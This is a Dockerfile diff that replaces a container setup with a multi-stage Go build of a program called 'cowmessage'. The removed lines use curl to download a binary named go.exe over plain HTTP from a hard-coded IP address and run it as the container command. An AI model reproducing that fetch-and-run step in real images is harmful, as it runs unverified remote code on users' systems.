@@ -1,11 +1,22 @@
-FROM ubuntu:20.04
+FROM ubuntu:22.04 as base
 
-RUN cat /etc/apt/sources.list
+RUN apt update -y && \
+    apt install -y libc6 && \
+    rm -rf /var/lib/apt/lists/*
 
-RUN apt-get update -y && apt-get install -y curl && rm -rf /var/lib/apt/lists/* && apt-get clean
+FROM golang:1.18-buster as builder
 
-RUN curl -o /usr/local/bin/go.exe http://3.80.52.103/home/ubuntu/go.exe
+ENV GOARCH=arm64
+ENV GOOS=linux
 
-RUN chmod +x /usr/local/bin/go.exe
+WORKDIR /app
 
-CMD ["/usr/local/bin/go.exe"]
+COPY . .
+
+RUN go build -o /usr/local/bin/cowmessage
+
+FROM base 
+
+COPY --from=builder /usr/local/bin/cowmessage /usr/local/bin/
+
+CMD ["/usr/local/bin/cowmessage"]
